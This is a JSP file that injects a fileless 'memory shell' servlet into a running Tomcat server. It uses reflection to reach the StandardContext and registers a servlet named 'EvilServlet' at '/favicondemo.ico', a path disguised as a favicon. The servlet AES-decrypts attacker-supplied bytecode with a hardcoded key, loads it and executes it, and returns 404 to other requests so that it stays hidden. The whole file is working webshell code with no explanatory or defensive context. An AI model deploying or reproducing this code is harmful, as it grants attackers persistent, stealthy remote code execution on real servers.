<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext"%>
<%@ page import="org.apache.catalina.core.StandardContext"%>
<%@ page import="javax.servlet.*"%>
<%@ page import="javax.servlet.http.*"%>
<%@ page import="java.io.IOException"%>
<%@ page import="java.lang.reflect.Field"%>

<%
class EvilServlet implements Servlet{
    @Override
    public void init(ServletConfig config) throws ServletException {}
    @Override
    public String getServletInfo() {return null;}
    @Override
    public void destroy() {}    public ServletConfig getServletConfig() {return null;}

    
    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;

        if (request.getMethod().equals("POST")) {
            try {
                String k = "42b842fc69195c9d";
                HttpSession session = request.getSession();
                session.setAttribute("u", k);

                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

                Map<String, Object> pageContext = new HashMap<String, Object>();
                pageContext.put("session", session);
                pageContext.put("request", request);
                pageContext.put("response", response);
                new U(this.getClass().getClassLoader())
                    .g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine())))
                    .newInstance()
                    .equals(pageContext);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            response.sendError(HttpServletResponse.SC_NOT_FOUND);
        }
    }
}

%>

<%
    ServletContext servletContext =  request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); 
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); 
    EvilServlet evilServlet = new EvilServlet();


    org.apache.catalina.Wrapper evilWrapper = standardContext.createWrapper();
    evilWrapper.setName("favicondemo.ico");
    evilWrapper.setLoadOnStartup(1);
    evilWrapper.setServlet(evilServlet);
    evilWrapper.setServletClass(evilServlet.getClass().getName());
    standardContext.addChild(evilWrapper);
    standardContext.addServletMapping("/favicondemo.ico", "favicondemo.ico");

    out.println("动态注入servlet成功");

%>
